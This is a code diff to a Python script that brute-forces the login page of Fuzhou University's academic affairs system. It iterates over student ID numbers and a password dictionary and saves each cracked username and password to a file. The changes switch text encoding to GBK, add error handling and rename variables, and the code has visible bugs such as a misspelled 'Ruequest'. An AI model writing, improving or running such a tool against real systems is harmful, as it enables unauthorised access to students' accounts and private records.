@@ -38,13 +38,13 @@ def Blasting():
 		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
 		'Accept': 'text/html',
 		'Accept-Encoding': 'gzip, deflate',
-		'Referer': 'http://jwch.fzu.edu.cn/',
+		'Referer': 'http://jwch.fzu.edu.cn/'
 	}
 	data = {'Content-Type': 'application/x-www-form-urlencoded', 'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
 	re_pass = re.compile('福州大学教务处本科教学管理系统')
 	re_user = re.compile('^user:\s*(\d{9})\s*sex:\s*(male|female)$')
 
-	def Blast(bmuser, bpasswd):
+	def Blast(buser, bpasswd):
 		for user in buser:
 			data['muser'] = user
 			for x in bpasswd:
@@ -53,14 +53,18 @@ def Blasting():
 				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
 				time.sleep(0.01)
 				try :
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
+					response = request.urlopen(req, data = parse.urlencode(data).encode('gbk'))	
 				except error.HTTPError as e:
 					req = request.Ruequest(response.geturl(), headers = head)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+					response = request.urlopen(req, data = parse.urlencode(data).encode('gbk'))
 				except error.URLError as e:
 					time.sleep(10)
-					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
+					response = request.urlopen(req, data = parse.urlencode(data).encode('gbk'))
+				except Exception as e:
+					print(response.getcode())
+					time.sleep(10)					
+					#pass
+				if re_pass.search(response.read().decode(encoding = 'gbk', errors = 'ignore')):
 					r.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
 					r.flush()
 					print('Get the password of user: %s' % user)
@@ -77,7 +81,7 @@ def Blasting():
 			muser.append(y.group(1))
 		else :
 			fuser.append(y.group(1))
-	s.close()
+	d.close()
 
 	dictpath = input('Please enter the abspath of your dictionary(or press enter): ')	
 	t = -1
